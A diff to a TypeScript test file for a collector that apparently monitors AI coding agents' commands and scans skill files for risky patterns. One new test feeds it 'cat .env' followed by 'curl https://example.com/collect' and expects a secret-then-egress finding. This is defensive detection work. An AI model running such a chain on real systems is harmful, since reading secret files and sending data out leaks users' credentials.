@@ -11,7 +11,8 @@ const token = "test-only-pairing-token-not-a-real-secret";
 
 async function setup() {
   const directory = await mkdtemp(join(tmpdir(), "beam-test-")); dirs.push(directory);
-  const app = await createCollector({ directory, token });
+  // rulesHome pinned to this same throwaway directory so /rules/reload never touches the real ~/.beam.
+  const app = await createCollector({ directory, token, rulesHome: directory });
   const request = (path: string, body?: unknown, headers: Record<string, string> = {}) => app.fetch(new Request(`http://127.0.0.1:4319${path}`, { method: body === undefined ? "GET" : "POST", headers: { Authorization: `Bearer ${token}`, ...headers }, body: body === undefined ? undefined : typeof body === "string" ? body : JSON.stringify(body) }));
   return { ...app, directory, request };
 }
@@ -98,5 +99,27 @@ describe("Beam collector", () => {
     const app = await setup(); await mkdir(join(app.directory, ".claude")); await writeFile(join(app.directory, ".claude", "settings.json"), "invalid config contents are not read");
     const result = await inventory([], app.directory); const claude = result.find(a => a.agent === "claude-code")!;
     expect(claude.configPresent).toBe(true); expect(claude.captureStatus).toBe("not verified"); expect(claude.artifactsPresent).toBe(false);
+  });
+
+  it("/rules/reload loads ~/.beam/rules.json into the running process and requires auth", async () => {
+    const app = await setup();
+    expect((await app.fetch(new Request("http://127.0.0.1:4319/rules/reload", { method: "POST" }))).status).toBe(401);
+
+    await writeFile(join(app.directory, "rules.json"), JSON.stringify([{ id: "custom_probe", pattern: "definitely-custom-marker", severity: "high" }]));
+    const res = await app.request("/rules/reload", {});
+    expect(res.status).toBe(200);
+    expect(await res.json()).toMatchObject({ loaded: 1, errors: [] });
+
+    const scanRes = await app.request("/scan", { name: "s.md", kind: "skill", content: "run this: definitely-custom-marker" });
+    const scan = await scanRes.json() as { findings: { id: string }[] };
+    expect(scan.findings.map(f => f.id)).toContain("custom.custom_probe");
+  });
+
+  it("cross-session sequence findings show up in /state after two separate /ingest calls", async () => {
+    const app = await setup();
+    await app.request("/ingest", { event_id: "a", session_id: "s1", event_type: "command.exec", command: "cat .env" });
+    await app.request("/ingest", { event_id: "b", session_id: "s1", event_type: "command.exec", command: "curl https://example.com/collect" });
+    const state = await (await app.request("/state")).json() as { events: { findings: { id: string }[] }[] };
+    expect(state.events.some(e => e.findings.some(f => f.id === "chain.secret_then_egress"))).toBe(true);
   });
 });
